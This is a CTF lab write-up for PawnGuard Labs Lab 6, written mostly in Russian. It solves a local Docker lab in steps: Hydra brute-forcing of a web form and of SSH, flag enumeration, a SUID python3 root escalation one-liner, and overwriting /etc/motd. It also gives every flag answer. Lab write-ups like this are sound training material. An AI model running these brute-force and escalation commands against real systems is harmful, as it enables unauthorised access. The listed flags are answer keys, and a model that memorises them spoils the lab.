# Lab 6 — La Cadena de Mando | Writeup

**CTF:** PawnGuard Labs  
**Dificultad:** Hard  
**Categoría:** Linux / Web  
**Flags:** 5/5

---

## Reconnaissance

Docker-контейнер поднимает два сервиса:
- `4344` → 80 — Node.js/Express веб-сервер
- `2226` → 22 — SSH

---

## Парт 1  Brute Force веба (Flag 1)

### Разведка главной страницы

```bash
curl -v http://localhost:4344/
```

```html
<!DOCTYPE html>
<!-- USERNAME: slowerpepaef -->
<html lang="en">
  ...
  <!-- REAL USERNAME: pedrito -->
  ...
  <!-- Next stop... /dashboard2 -->
  ...
  <input type="text" id="pawnguard" name="pawnguard" />
  <input type="password" id="redes" name="redes" />
```

Исходник страницы раскрывает:
- Настоящий логин: `pedrito`
- Поля формы: `pawnguard` (логин) и `redes` (пароль)
- Следующий эндпоинт: `/dashboard2`

### Определяем текст ошибки

```bash
curl -X POST http://localhost:4344/login \
  -d "pawnguard=pedrito&redes=wrongpass" -s
```

```
Invalid username or password.
For correct passwords: Found. Redirecting to /dashboard2
```

### Brute Force через Hydra

```bash
hydra -l pedrito \
  -P ~/Desktop/labs-first-edition/lab6/dictionaries/wordlist.txt \
  localhost -s 4344 http-post-form \
  "/login:pawnguard=^USER^&redes=^PASS^:Invalid username or password." -t 10
```

```
[4344][http-post-form] host: localhost   login: pedrito   password: 123123
1 of 1 target successfully completed, 1 valid password found
```

### Логинимся и проверяем dashboard2

```bash
curl -X POST http://localhost:4344/login \
  -d "pawnguard=pedrito&redes=123123" \
  -c cookies.txt -s

curl http://localhost:4344/dashboard2 -b cookies.txt -s | grep -i "<!--"
```

```html
<!-- Crea tu flag con alguna de las palabras: LINUSTOLVARDS | LINUXEROS | LINUXPEPERS | PEDRITOSOLA | STARTING_CTF | HARDCTF -->
<!-- Esta es la ruta /dashboard2. Recuerda para que era importante este dato. -->
```

### Перебор флагов через /validation

```bash
for word in LINUSTOLVARDS LINUXEROS LINUXPEPERS PEDRITOSOLA STARTING_CTF HARDCTF; do
  echo -n "PWG{$word}: "
  curl -s -X POST http://localhost:4344/validation \
    -b cookies.txt \
    -H "Content-Type: application/json" \
    -d "{\"flag\": \"PWG{$word}\"}"
  echo
done
```

```
PWG{LINUSTOLVARDS}: Invalid flag
PWG{LINUXEROS}: {"result":1,"username":"hacker"}
PWG{LINUXPEPERS}: Invalid flag
PWG{PEDRITOSOLA}: Invalid flag
PWG{STARTING_CTF}: Invalid flag
PWG{HARDCTF}: Invalid flag
```

**Флаг:** `PWG{LINUXEROS}`  
**Следующий SSH юзер:** `hacker`

---

## Парт 2 — SSH Brute Force + SUID Python (Flag 2)

### Brute Force SSH для hacker

```bash
hydra -l hacker \
  -P ~/Desktop/labs-first-edition/lab6/dictionaries/wordlist1.txt \
  localhost -s 2226 ssh -t 4 -I
```

```
[2226][ssh] host: localhost   login: hacker   password: rompedordemadrEs
1 of 1 target successfully completed, 1 valid password found
```

### Подключение и разведка

```bash
ssh hacker@localhost -p 2226
# пароль: rompedordemadrEs
```

```
hacker@b4526c181748:~$ sudo -l
sudo: Sorry, user hacker may not run sudo on b4526c181748.

hacker@b4526c181748:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/sudo.ws
/usr/bin/python3.14     <-- SUID!
/usr/lib/cargo/bin/sudo
/usr/lib/cargo/bin/su
```

```bash
cat ~/Instructions.txt
```

```
En Linux existen un tipo de permisos especiales llamado SUID.
Si observas, tienes un script, el cual, aprovechando este tipo de permisos,
te permitirá ejecutar comandos como si el dueño del archivo lo estuviese ejecutando.
```

### Эскалация через SUID python3.14

```bash
/usr/bin/python3.14 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

```
root@b4526c181748:~#
```

**Root получен!**

---

## Парт 3 — Поиск флагов в PDF (Flags 2, 3, 4)

### Поиск всех PDF файлов

```bash
find /home -name "*.pdf" 2>/dev/null
```

```
/home/hacker/main/level_19/sub_1/file.pdf
/home/hacker/main/level_16/sub_3/other.pdf
/home/hacker/main/level_20/sub_1/FLAG.pdf
/home/hacker/main/level_9/flag.pdf
/home/hacker/main/level_5/sub_2/myFile.pdf
```

### Глобальный поиск флагов

```bash
grep -r "PWG{" /home/ 2>/dev/null
```

```
/home/hacker/main/level_9/flag.pdf:PWG{WUJUUU}
/home/hacker/main/level_5/sub_2/myFile.pdf:PWG{linuxmover}
/home/noTeEstreses/main/level_45/sub_2/new.rkt:PWG{HARD}
```

### Проверка FLAG.pdf

```bash
strings /home/hacker/main/level_20/sub_1/FLAG.pdf | grep -i "PWG"
```

```
PWg{moverlinux}
```

**Флаг 2:** `PWG{WUJUUU}` — найден в `level_9/flag.pdf`  
**Флаг 3:** `PWG{linuxmover}` — найден в `level_5/sub_2/myFile.pdf`  
**Флаг 4:** `PWG{HARD}` — найден в `level_45/sub_2/new.rkt`

---

## Парт 4 — Изменение MOTD баннера (Flag 5)

### Читаем инструкции

```bash
cat /home/Administrator/Instructions.txt
```

```
Te tengo buenas noticias, ya estás en la parte final. ¡Muchas felicidades!
Ahora, tendrás que modificar el banner que todos ven al conectarse mediante SSH.
Tendrás que encontrar el directorio, la información está por ahí...
```

### Изменяем /etc/motd

```bash
echo "NSA was here" > /etc/motd
```

### Проверяем результат

```bash
ssh hacker@localhost -p 2226
# пароль: rompedordemadrEs
```

```
NSA was here
hacker@b4526c181748:~$
```

**Флаг 5:** чтобы получить этот флаг нужно написать staff в дискорд со крином измененного MOTD

<img width="1485" height="587" alt="ds" src="https://github.com/user-attachments/assets/f9baa1b2-82fd-49de-8784-04229c37799d" />


---

## Итоговая таблица флагов

| # | Уязвимость | Техника | Флаг |
|---|-----------|---------|------|
| 1 | Web Brute Force + Hidden Comments | Hydra + /validation enum | `PWG{LINUXEROS}` |
| 2 | File Search in Directories | `grep -r "PWG{"` в PDF | `PWG{WUJUUU}` |
| 3 | File Search in Directories | `grep -r "PWG{"` в PDF | `PWG{linuxmover}` |
| 4 | File Search in Directories | `grep -r "PWG{"` в .rkt | `PWG{HARD}` |
| 5 | SUID Privesc + MOTD | python3.14 SUID → root → `/etc/motd` | *(у staff)* |

---

## Вывод

Лаборатория демонстрирует цепочку атак:

1. **Source Code Review** → логин и имена полей скрыты в HTML комментариях
2. **Web Brute Force** → Hydra против нестандартных полей формы
3. **API Enumeration** → перебор флагов через `/validation`
4. **SSH Brute Force** → поиск пароля по кастомному словарю
5. **SUID Privesc** → `python3.14` с SUID битом для получения root
6. **File Enumeration** → поиск флагов в глубоких директориях через `grep -r`
7. **MOTD Modification** → изменение баннера SSH как финальное доказательство root доступа
